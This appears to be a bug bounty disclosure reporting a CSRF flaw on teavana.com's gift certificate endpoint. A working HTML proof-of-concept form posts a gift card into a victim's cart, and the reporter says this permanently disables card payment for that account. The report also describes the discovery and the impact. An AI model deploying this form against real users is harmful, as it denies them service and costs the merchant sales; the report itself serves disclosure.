  "vulnerability_information": "SUMMARY\n--------------\nHello, I have found an extremely interesting issue that can be used to permanently lock a user's possibility of ever buying anything from teavana.com by removing the credit card payment method.\n\nPOC\n---------\nCSRF snippet\n```\n<html>\n\t<head></head>\n\t<body>\n\t\t<form method=\"POST\" id=\"GiftCertificateForm\" action=\"http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_from\" type=\"text\" name=\"dwfrm_giftcert_purchase_from\" value=\"Test whatever\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipient\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipient\" value=\"Test whhhateever\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n\t\t\t<textarea class=\"textbox\" id=\"dwfrm_giftcert_purchase_message\" name=\"dwfrm_giftcert_purchase_message\" rows=\"5\" cols=\"50\">Bla bla</textarea>\n\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_amount\" type=\"text\" name=\"dwfrm_giftcert_purchase_amount\" value=\"100\" maxlength=\"2147483647\">\n\t\t\t<input type=\"submit\" value=\"Send\" />\n\t\t</form>\n\t</body>\n</html>\n```\n\nDESCRIPTION\n----------------\nSo, I just wanted to find demandware.store hidden links and in my search I stumbled across\n```\nhttp://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase\n```\nFrom here, one can add custom gift cards in cart with a value between 5 and 5000 euros (or something like that). I have noticed that this is not CSRF protected, but this was a minor issue. Well, it became a serious problem after I noticed that after adding that gift card in my card, I wasn't able to fully empty my cart anymore and the credit card option was simply not available anymore and I wasn't able to fulfill any orders. Logging out and in doesn't do anything. Deleting cart product doesn't do anything. And because I tested teavana for some time, I know for a fact that the items in cart stay in cart (even after weeks).\n\nSo, I have made a new account, added the CSRF POC in a script then tested the flow and it worked. I have made my account unable to buy anything by adding that gift card in cart.\n\nIMPACT\n----------------\nPermanently denying a user the possibility to fulfill with his account any orders is a very big issue (hence the High severity I personally find) and if someone launched an attack against you, you will lose customers and money (not to mention the potentially negative publicity)\n\nVideo POC attached.\n\n",
